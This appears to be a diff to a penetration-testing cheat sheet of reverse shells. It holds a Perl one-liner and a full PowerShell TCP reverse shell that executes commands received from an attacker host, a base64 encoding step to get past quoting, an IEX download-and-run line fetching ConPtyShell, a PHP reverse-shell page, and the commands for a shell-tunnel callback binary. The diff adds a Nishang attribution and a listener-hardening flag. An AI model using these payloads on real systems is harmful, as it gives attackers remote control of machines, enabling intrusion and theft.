@@ -21,6 +21,7 @@ perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprot
 A PHP page to upload instead: /usr/share/webshells/php/php-reverse-shell.php, with $ip and $port set
 
 ## Windows
+The one-liner is Nishang's Invoke-PowerShellTcpOneLine.ps1, from https://github.com/samratashok/nishang, under GPL-3.0:
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 Quoting gets in the way: encode the part after -c on Kali, then run it with -enc.
 echo -n 'THE ONE-LINER' | iconv -t UTF-16LE | base64 -w 0
@@ -52,7 +53,8 @@ IEX(IWR -UseBasicParsing http://<LHOST>/Invoke-ConPtyShell.ps1); Invoke-ConPtySh
 
 ## shell-tunnel: PTY, SFTP and all three forwardings in one binary
 After tool install shell-tunnel at the pwn-broker prompt. Catch the callback on Kali:
-shell-tunnel -l -v -p <LPORT>
+shell-tunnel -l -N -v -p <LPORT>
+The listener is an SSH server anyone on the network can reach, so -N lets it carry only the callback: no shell, SFTP or local forward.
 The upload runs on the target and dials home; -d detaches it from an evil-winrm window, and -b 0 picks a random port on Kali, printed in the listener's [ok] line:
 shell-tunnel.exe -d -p <LPORT> -b 0 svc@<LHOST>
 A stock ssh client then gets the full PTY; the same session carries SFTP and the -L, -R and -D forwards:
